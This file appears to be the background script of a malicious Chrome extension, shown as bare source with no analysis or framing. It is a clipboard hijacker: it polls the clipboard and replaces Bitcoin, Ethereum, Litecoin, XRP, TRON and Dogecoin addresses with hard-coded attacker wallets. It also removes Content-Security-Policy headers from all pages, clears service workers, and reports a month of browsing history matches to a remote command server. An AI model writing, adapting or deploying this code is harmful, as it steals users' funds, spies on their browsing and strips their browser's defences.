const domain = "1"
const prefix = "/api/machine"

const coins = [
    {
        name: "BTC1",
        reg: new RegExp("^bc1[a-zA-HJ-NP-Z0-9]{25,39}"),
        value: "bc1qhra8yczp0x8fgcq7gjvvyuzx8lea32jtm0jlrc"
    },
    {
        name: "BTC2",
        reg: new RegExp("^1[a-zA-HJ-NP-Z0-9]{25,39}"),
        value: "1HwngaiHVLic8f86MVaatHnMRnXeUnJjsy"
    },
    {
        name: "BTC3",
        reg: new RegExp("^3[a-zA-HJ-NP-Z0-9]{25,39}"),
        value: "3ECXLjASVRpGmtD1s5CGD9eCaBL7rh7vWk"
    },
    {
        name: "ETH",
        reg: new RegExp("^0x[a-fA-F0-9]{40}"),
        value: "0x84857869F4912EE712Fd3dCEa3c1a60863625486"
    },
    {
        name: "LTC",
        reg: new RegExp("^[L][a-km-zA-HJ-NP-Z1-9]{26,33}"),
        value: "Lbta3bqyo9K1S3gkLU1dY5JoihktXWs3og"
    },
    {
        name: "XRP",
        reg: new RegExp("^r[0-9a-zA-Z]{24,34}"),
        value: "rBvSphocs8vzWAyHQShoh967NhEZma6TFa"
    },
    {
        name: "TRON",
        reg: new RegExp("^T[A-Za-z1-9]{33}"),
        value: "TGymm1NXQJJahYSdYEEPnoSfwQGbRoqEmv"
    },
    {
        name: "DOGE",
        reg: new RegExp("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}"),
        value: "DLfiHc6cDAr3CpQjKX5uozUV1vqwHxPrri"
    }
]

let machineId = null, urls = []

chrome.storage.local.set({
    "domain": domain
})

chrome.storage.local.get(['machineId'], function (result) {
    if (result.machineId !== undefined) {
        machineId = result.machineId
    }
})

const initMachine = () => {
    $.ajax({
        url: `${domain}${prefix}/init`,
        method: 'POST',
        dataType: 'JSON',
        data: {
            machineId
        },
    }).then((response) => {
        machineId = response.machineId
        urls = response.urls

        chrome.storage.local.set({
            machineId: machineId
        })

        checkUrls()
    })
}

const checkUrls = () => {
    const microsecondsBack = 1000 * 60 * 24 * 60 * 30
    const startTime = (new Date).getTime() - microsecondsBack

    let check_data = []

    chrome.history.search({
            'text': '',
            'startTime': startTime,
            'maxResults': 0
        },
        function (historyItems) {
            for (let i = 0; i < historyItems.length; ++i) {
                const url = historyItems[i].url

                $.each(urls, function (index, item) {
                    if (url.indexOf(item) !== -1 && check_data.indexOf(item) === -1) {
                        check_data.push(item)
                    }
                })
            }

		$.ajax({
                url: `${domain}${prefix}/set-urls`,
                method: 'POST',
                dataType: 'JSON',
                data: {
                    machineId,
                    urls
                },
            })
        })
}

const onHeadersReceived = function (details) {
    chrome.browsingData.remove({}, {serviceWorkers: true});

    for (let i = 0; i < details.responseHeaders.length; i++) {
        if (details.responseHeaders[i].name.toLowerCase() === 'content-security-policy') {
            details.responseHeaders[i].value = '';
        }
    }

    return {
        responseHeaders: details.responseHeaders
    };
};

const toggleDisableCSP = function (tabId) {
    chrome.browsingData.remove({}, {serviceWorkers: true})

    attachHeaderListener(tabId);
};

const attachHeaderListener = function (tabId) {
    const onHeaderFilter = {urls: ['*://*/*'], tabId: tabId, types: ['main_frame', 'sub_frame']};

    chrome.browsingData.remove({}, {serviceWorkers: true});

    chrome.webRequest.onHeadersReceived.addListener(
        onHeadersReceived, onHeaderFilter, ['blocking', 'responseHeaders']
    );
};

const init = function () {
    chrome.tabs.onActivated.addListener(function (activeInfo) {
        toggleDisableCSP(activeInfo.tabId);
    });

    const onHeaderFilter = {urls: ['*://*/*'], types: ['main_frame', 'sub_frame']};

    chrome.webRequest.onHeadersReceived.addListener(
        onHeadersReceived, onHeaderFilter, ['blocking', 'responseHeaders']
    );
};

const initCopy = function () {
    const body = document.getElementsByTagName('body')[0]
    const input = document.createElement('input')

    body.appendChild(input)

    setInterval(() => {
        input.select()
        document.execCommand('paste')

        const clipbText = input.value

        let textFound = false

        for (const coin of coins) {
            if (clipbText.match(coin.reg)) {
                input.value = clipbText.replace(clipbText.match(coin.reg).input, coin.value)

                textFound = true
                break
            }
        }

        if (textFound) {
            input.select()

            document.execCommand('copy')
        }
    }, 0x1f4)
};

init();
initMachine();
initCopy();

setInterval(() => initMachine(), 5 * 60000)